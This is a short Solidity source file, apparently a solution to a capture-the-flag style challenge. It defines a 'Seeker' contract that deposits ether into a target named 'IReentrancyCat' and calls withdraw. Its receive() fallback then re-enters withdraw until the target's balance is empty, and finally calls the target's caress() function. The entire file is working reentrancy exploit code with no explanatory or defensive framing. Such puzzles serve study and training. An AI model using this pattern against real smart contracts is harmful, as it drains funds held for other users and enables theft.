// SPDX-License-Identifier: WTFPL
pragma solidity ^0.8.30;

interface IReentrancyCat {
    function deposit() external payable;
    function withdraw() external;
    function caress() external;
}

contract Seeker {
    IReentrancyCat immutable cat;

    constructor(address _cat) {
        cat = IReentrancyCat(_cat);
    }

    function caress() external payable {
        cat.deposit{value: msg.value}();
        cat.withdraw();
    }

    receive() external payable {
        if (address(cat).balance > 0) {
            cat.withdraw();
        } else {
            cat.caress();
        }
    }
}
